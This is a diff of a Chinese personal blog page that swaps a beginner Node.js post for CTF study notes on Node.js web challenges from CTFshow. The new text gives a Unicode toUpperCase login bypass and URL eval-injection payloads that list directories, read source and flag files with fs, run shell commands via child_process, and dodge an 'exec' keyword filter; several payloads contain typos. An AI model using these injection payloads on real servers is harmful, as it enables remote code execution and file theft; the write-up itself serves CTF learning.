@@ -20,22 +20,21 @@
     var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。冲冲冲！ Node.js创建第一个应用说node.js可以完成后端代码的一条龙服务      创建应用的具体步骤https:&#x2F;&#x2F;www.runoob.com&#x2F;nodejs&#x2F;nodejs-http-server.html具体操作：可行">
+  <meta name="description" content="后天会遇到Node.js题目，突击一哈 基础介绍P神：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;200406.html toUpperCase与toLowerCase()toUpperCase()：小写变大写，字符ı、ſ 经处理后结果为 I、S toLowerCase()：大写变小写，字符İ会转变为i，字符K经处理后结果为k CTFshow334 123return">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Node.js学习笔记">
-<meta property="og:url" content="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="nodejs">
+<meta property="og:url" content="https://jingdaqiang.github.io/2021/04/22/nodejs/index.html">
 <meta property="og:site_name" content="Daq1ang">
-<meta property="og:description" content="今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。冲冲冲！ Node.js创建第一个应用说node.js可以完成后端代码的一条龙服务      创建应用的具体步骤https:&#x2F;&#x2F;www.runoob.com&#x2F;nodejs&#x2F;nodejs-http-server.html具体操作：可行">
+<meta property="og:description" content="后天会遇到Node.js题目，突击一哈 基础介绍P神：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;200406.html toUpperCase与toLowerCase()toUpperCase()：小写变大写，字符ı、ſ 经处理后结果为 I、S toLowerCase()：大写变小写，字符İ会转变为i，字符K经处理后结果为k CTFshow334 123return">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/images/nodejs1.0.png">
-<meta property="article:published_time" content="2021-02-02T07:35:04.000Z">
-<meta property="article:modified_time" content="2021-02-03T02:31:39.972Z">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/04/22/nodejs/1.0.png">
+<meta property="article:published_time" content="2021-04-22T11:45:57.000Z">
+<meta property="article:modified_time" content="2021-04-23T13:44:26.978Z">
 <meta property="article:author" content="六公子买单">
-<meta property="article:tag" content="runoob.com">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/images/nodejs1.0.png">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/04/22/nodejs/1.0.png">
 
-<link rel="canonical" href="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+<link rel="canonical" href="https://jingdaqiang.github.io/2021/04/22/nodejs/">
 
 
 <script id="page-configurations">
@@ -48,7 +47,7 @@
   };
 </script>
 
-  <title>Node.js学习笔记 | Daq1ang</title>
+  <title>nodejs | Daq1ang</title>
   
 
 
@@ -153,7 +152,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/22/nodejs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -166,7 +165,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Node.js学习笔记
+          nodejs
         </h1>
 
         <div class="post-meta">
@@ -176,14 +175,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2021-02-02 15:35:04" itemprop="dateCreated datePublished" datetime="2021-02-02T15:35:04+08:00">2021-02-02</time>
+              <time title="Created: 2021-04-22 19:45:57" itemprop="dateCreated datePublished" datetime="2021-04-22T19:45:57+08:00">2021-04-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-03 10:31:39" itemprop="dateModified" datetime="2021-02-03T10:31:39+08:00">2021-02-03</time>
+                <time title="Modified: 2021-04-23 21:44:26" itemprop="dateModified" datetime="2021-04-23T21:44:26+08:00">2021-04-23</time>
               </span>
 
           
@@ -197,9 +196,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。<br>冲冲冲！</p>
-<h2 id="Node-js创建第一个应用"><a href="#Node-js创建第一个应用" class="headerlink" title="Node.js创建第一个应用"></a>Node.js创建第一个应用</h2><p><img src="images/nodejs1.0.png" alt="nodejs1.0"><br>说node.js可以完成后端代码的一条龙服务     </p>
-<h3 id="创建应用的具体步骤"><a href="#创建应用的具体步骤" class="headerlink" title="创建应用的具体步骤"></a>创建应用的具体步骤</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-http-server.html">https://www.runoob.com/nodejs/nodejs-http-server.html</a><br>具体操作：可行</p>
+        <p>后天会遇到Node.js题目，突击一哈</p>
+<h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><p>P神：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/200406.html">https://www.freebuf.com/articles/web/200406.html</a></p>
+<h1 id="toUpperCase与toLowerCase"><a href="#toUpperCase与toLowerCase" class="headerlink" title="toUpperCase与toLowerCase()"></a>toUpperCase与toLowerCase()</h1><p>toUpperCase()：小写变大写，字符ı、ſ 经处理后结果为 I、S</p>
+<p>toLowerCase()：大写变小写，字符İ会转变为i，字符K经处理后结果为k</p>
+<p>CTFshow334</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return users.find(function(item)&#123;</span><br><span class="line">  return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>name不等于CTFSHOW，但是经过toUpperCase之后的name=CTFSHOW,得</p>
+<pre><code>name=ctfſhow 或 ctfshow</code></pre>
+<h1 id="fs模块和child-process模块"><a href="#fs模块和child-process模块" class="headerlink" title="fs模块和child_process模块"></a>fs模块和child_process模块</h1><h2 id="fs模块：可以用来读取文件以及查看目录"><a href="#fs模块：可以用来读取文件以及查看目录" class="headerlink" title="fs模块：可以用来读取文件以及查看目录"></a>fs模块：可以用来读取文件以及查看目录</h2><p>先补充知识：<br><img src="/2021/04/22/nodejs/1.0.png"><br>则利用</p>
+<pre><code>?eval=_filename  //获得当前的模块文件路径</code></pre>
+<p>require（’fs’）</p>
+<p>fs.readdirSync(path[, options])//可以用来查看目录<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const fs &#x3D; require(&#39;fs&#39;)</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">  const data &#x3D; fs.readFileSync(&#39;&#x2F;Users&#x2F;joe&#x2F;test.txt&#39;, &#39;utf8&#39;)</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125; catch (err) &#123;</span><br><span class="line">  console.error(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看当前目录：fs.readdirSync(.) 用点来查看当前目录</p>
+<p>查看到了当前目录，那么读取当前目录下的文件内容要用到的函数就是：</p>
+<p>fs.readfileSync(1.txt)即可读取 。<br>这里给出playload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?eval&#x3D;reqrise(&#39;fs&#39;).readdirSync(.)  查看当前目录</span><br><span class="line">?eval&#x3D;require(&#39;fs&#39;).readfileSync(1.txt) 读取文件</span><br></pre></td></tr></table></figure>
+<p>web336：根据_filename读到的路径（源码），利用fs模块读取文件</p>
+<pre><code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code></pre>
+<p>web336法二：或者利用fs模块读取当前目录的文件名，然后再利用fs模块读取这个文件：：<br>    ?eval=require(‘fs’).readdirSync(‘.’)<br>    ?eval=require(‘fs’).readFileSync(‘fl001g.txt’,’utf-8’)</p>
+<h2 id="child-process模块："><a href="#child-process模块：" class="headerlink" title="child_process模块："></a>child_process模块：</h2><p>child_process:简单来说就可以理解成 具有命令执行的模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;).execSync(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;&#x2F;&#39; ] ).stdout.toString()&#x2F;&#x2F;查看下一层的目录</span><br><span class="line"></span><br><span class="line">require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();</span><br><span class="line"></span><br><span class="line">require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>web336：读源码发现过滤了exec,利用和ssti中类似的绕过手法:</p>
+<pre><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></pre>
 
     </div>
 
@@ -208,9 +228,6 @@
     
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/runoob-com/" rel="tag"># runoob.com</a>
-          </div>
 
         
 
@@ -218,12 +235,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" rel="prev" title="buu-随便注">
-      <i class="fa fa-chevron-left"></i> buu-随便注
+    <a href="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="命令执行">
+      <i class="fa fa-chevron-left"></i> 命令执行
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/03/03/buu-piapiapia/" rel="next" title="buu-piapiapia">
-      buu-piapiapia <i class="fa fa-chevron-right"></i>
+    <a href="/2021/04/24/%E5%B0%8F%E5%86%85%E5%8D%B7/" rel="next" title="小内卷">
+      小内卷 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -283,7 +300,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Node-js%E5%88%9B%E5%BB%BA%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">Node.js创建第一个应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%BA%94%E7%94%A8%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.</span> <span class="nav-text">创建应用的具体步骤</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">基础介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#toUpperCase%E4%B8%8EtoLowerCase"><span class="nav-number">2.</span> <span class="nav-text">toUpperCase与toLowerCase()</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fs%E6%A8%A1%E5%9D%97%E5%92%8Cchild-process%E6%A8%A1%E5%9D%97"><span class="nav-number">3.</span> <span class="nav-text">fs模块和child_process模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fs%E6%A8%A1%E5%9D%97%EF%BC%9A%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8A%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95"><span class="nav-number">3.1.</span> <span class="nav-text">fs模块：可以用来读取文件以及查看目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#child-process%E6%A8%A1%E5%9D%97%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">child_process模块：</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -302,11 +319,11 @@
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
